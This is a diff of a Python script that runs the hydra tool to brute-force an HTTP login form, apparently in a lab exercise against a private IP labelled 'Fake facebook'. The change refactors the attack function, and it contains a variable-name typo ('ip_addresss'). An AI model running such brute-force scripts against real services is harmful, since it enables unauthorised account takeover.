@@ -27,7 +27,11 @@ def grab_success(output_lines, port, service_mode):
     return None
 
 
-def attack(username, passwords, ip_address, service_mode, address_and_details, port=80):
+def attack(moduleB, website_info):
+    username = moduleB.username
+    passwords = moduleB.filename
+    ip_addresss, service_mode, address_and_details, port = website_info.get_attack_info()
+
     proc = subprocess.Popen(['hydra', '-l', username, '-P', passwords, ip_address, '-s', port, service_mode, address_and_details], stdout = subprocess.PIPE)
 
     output = []
@@ -44,8 +48,12 @@ def attack(username, passwords, ip_address, service_mode, address_and_details, p
     else:
         print('failure')
 
+# From Part B
 username = 'arnav'
 passwords = '../passwords.txt'
+
+# From the database of things
+name = 'Fake facebook'
 ip_address = '192.168.2.65'
 port = '8080'
 service_mode = 'http-post-form'
